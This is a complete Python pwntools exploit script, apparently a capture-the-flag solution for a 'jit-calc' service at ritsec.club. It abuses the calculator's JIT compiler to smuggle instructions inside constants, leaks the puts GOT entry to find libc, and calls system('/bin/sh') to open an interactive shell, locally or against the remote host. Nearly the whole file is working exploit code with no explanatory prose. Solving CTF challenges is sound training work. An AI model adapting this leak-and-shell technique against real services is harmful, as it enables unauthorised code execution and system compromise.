#!/usr/bin/env python2
from pwn import *
from mypwntools import * # ~/workspace/tools/mypwntools/
import logging
import coloredlogs
# shellcodes['binsh32']
# shellcodes['binshx86_64']
# gethex(string)

coloredlogs.install()
log = logging.getLogger("Exploit")

#context.log_level = 'debug'
context.terminal = ['alacritty', '-e', 'sh', '-c']

BINARY = "./jit-calc"
HOST, PORT = 'ctfchallenges.ritsec.club', 8000
LIBC_PATH = './libc.so.6'

GDB_SETUP = """
set follow-fork-mode child
c
"""

if '--live' not in sys.argv:
    LIBC_PATH = '/usr/lib/libc.so.6'

    p = process(BINARY)
    if '--debug' in sys.argv:
        gdb.attach(p, GDB_SETUP)
else:
    p = remote(HOST, PORT)

if LIBC_PATH:
    libc = ELF(LIBC_PATH)

def write_constant_rax_bytes(const):
    return b'\x48\xb8' + p64(const)

def write_constant_rbx_bytes(const):
    return b'\x48\xbb' + p64(const)

def ret():
    return b'\x3c'

def add_rax_rax():
    return b'\x48\x01\xc0'

def add_rax_rbx():
    return b'\x48\x01\xd8'

def add_rbx_rax():
    return b'\x48\x01\xc3'

def add_rbx_rbx():
    return b'\x48\x01\xdb'

def write_constant_rax(const):
    return '3\n1\n' + str(const) + '\n'

def write_constant_rbx(const):
    return '3\n2\n' + str(const) + '\n'

def send_add_rax_rax():
    return '2\n3\n'

def send_add_rbx_rbx():
    return '2\n4\n'

def execute_code_with_rax_payload(code, rax=0):
    if len(code) != 6:
        assert False

    shellcode_overwrite = b''
    shellcode_base = b''

    write_overwrite = b''
    write_base = b''

    while(len(shellcode_overwrite) < 980):
        shellcode_overwrite += write_constant_rax_bytes(rax)
        write_overwrite += write_constant_rax(rax)
    shellcode_overwrite += add_rbx_rbx() * 2
    write_overwrite += send_add_rbx_rbx() * 2

    while(len(shellcode_base) < 980):
        shellcode_base += write_constant_rax_bytes(rax)
        write_base += write_constant_rax(rax)
    shellcode_base += add_rbx_rbx() * 1
    write_base += send_add_rbx_rbx() * 1

    shellcode_base += write_constant_rax_bytes(u64(b'\xFF' + code + b'\xc3')) # code to execute
    write_base += write_constant_rax(u64(b'\xFF' + code + b'\xc3')) # code to execute

    p.send(b'2\n' + write_base + '2\n' + write_overwrite + '4\n')
    p.recvuntil('Result: ', timeout=0.3)
    try:
        leak = int(p.recvline(timeout=0.3), 16)
    except ValueError:
        leak = 0
    return leak

puts_got = 0x602018
strlen_got = 0x602020

mov_rdi_rax_call_r14 = b"\x48\x89\xc7\x41\xff\xd6"
mov_r14_rdi = b'\x49\x89\xc6\x90\x90\x90'
mov_r14_value_at_rdi = b'\x4c\x8b\x30\x90\x90\x90'

mov_rax_into_r14 = b"\x49\x89\xc6\x90\x90\x90"
read_from_rax = b"\x48\x8b\x00\x90\x90\x90"

p.recvuntil('4: Run code')

puts_leak = execute_code_with_rax_payload(read_from_rax, puts_got)
print(hex(puts_leak))

system = puts_leak - libc.symbols['puts'] + libc.symbols['system']
binsh = puts_leak - libc.symbols['puts'] + next(libc.search('/bin/sh\x00'))

# write system to r14
execute_code_with_rax_payload(mov_r14_rdi, system)

# call r14, w/ '/bin/sh' as argument
execute_code_with_rax_payload(mov_rdi_rax_call_r14, binsh)


p.interactive()

